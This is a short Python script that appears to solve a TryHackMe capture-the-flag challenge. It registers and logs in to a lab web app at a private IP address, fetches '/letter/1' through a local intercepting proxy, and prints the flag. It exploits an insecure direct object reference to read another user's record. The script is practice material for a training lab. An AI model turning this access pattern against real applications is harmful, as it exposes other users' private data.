import urllib3
import requests
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


path="/letter/1"
url="http://10.48.182.60:5000"
registerPath="/register"
loginPath="/login"

registerCredentials={'username':'test1','password':'testtest'}

session=requests.session()

register=session.post(url+registerPath,data=registerCredentials,verify=False,proxies=proxies)

login=session.post(url+loginPath,data=registerCredentials,verify=False,proxies=proxies)

flagResponse=session.get(url+path,verify=False,proxies=proxies)

if "THM" in flagResponse.text:
    soup=BeautifulSoup(flagResponse.text,'html.parser')
    flagText=soup.find("pre",class_="letter").get_text(strip=True)

    print(flagText)

